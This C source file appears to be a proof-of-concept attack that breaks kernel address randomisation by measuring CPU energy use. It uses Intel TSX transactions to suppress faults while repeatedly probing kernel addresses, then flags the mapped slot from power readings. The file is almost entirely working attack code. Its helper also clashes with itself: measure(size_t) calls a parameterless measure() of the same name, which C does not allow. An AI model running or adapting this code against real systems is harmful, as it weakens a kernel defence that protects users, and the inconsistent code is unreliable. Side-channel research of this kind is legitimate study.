#include "../measure/measure.h"

#include <stdio.h>
#include <stdlib.h>

#define TRIES 10
#define AVG 120000

// TSX instructions
unsigned int xbegin() {
  unsigned status;
  asm volatile(".byte 0xc7,0xf8,0x00,0x00,0x00,0x00" : "=a"(status) : "a"(-1UL) : "memory");
  return status;
}

void xend() {
  asm volatile(".byte 0x0f; .byte 0x01; .byte 0xd5" ::: "memory");
}

// measure the energy consumption of a given kernel address
double measure(size_t offset) {
  double min = 0.0;

  for (size_t i = 0; i < TRIES; i++) {
    // start measurement
    Measurement begin = measure();

    for(size_t j = 0; j < AVG; j++) {
      // use TSX to suppress the exception
      if (xbegin() == (~0)) {
        while (true) {
          // access the kernel offset
          asm volatile ("mov (%0), %%rax"::"r"(offset):"rax");
        }
        xend();
      }
    }
    // stop measurement
    Measurement end = measure();
    Sample sample = convert(begin, end);

    // use minimum classifier!
    if(sample.energy < min || min == 0.0) {
      min = sample.energy;
    }
  }

  return min;
}

int main(int argc, char* argv[]) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s [<ground truth>]\n", argv[0]);
    return -1;
  }

  init();

  size_t real = strtoull(argv[1], NULL, 0);
  size_t start = real - 8 * 1024 * 1024;

  // warmup
  measure(start);
  measure(start);

  int step = 2*1024*1024;

  double mapped = measure(real);
  double unmapped = measure(start);
  double threshold = (mapped * 2 + unmapped) / 3;

  printf("%f < %f < %f\n", mapped, threshold, unmapped);

  for (size_t i = 0; i < 32; i++) {
    size_t address = start + i * step;
    double m = measure(address);
    printf("%2zu/32 %p (%.4f) %s %s\n", 
      i, 
      (void*) address, 
      m, 
      address == real ? "*" : " ", 
      m < threshold ? " <- found!" : ""
    );
  }

  return 0;
}

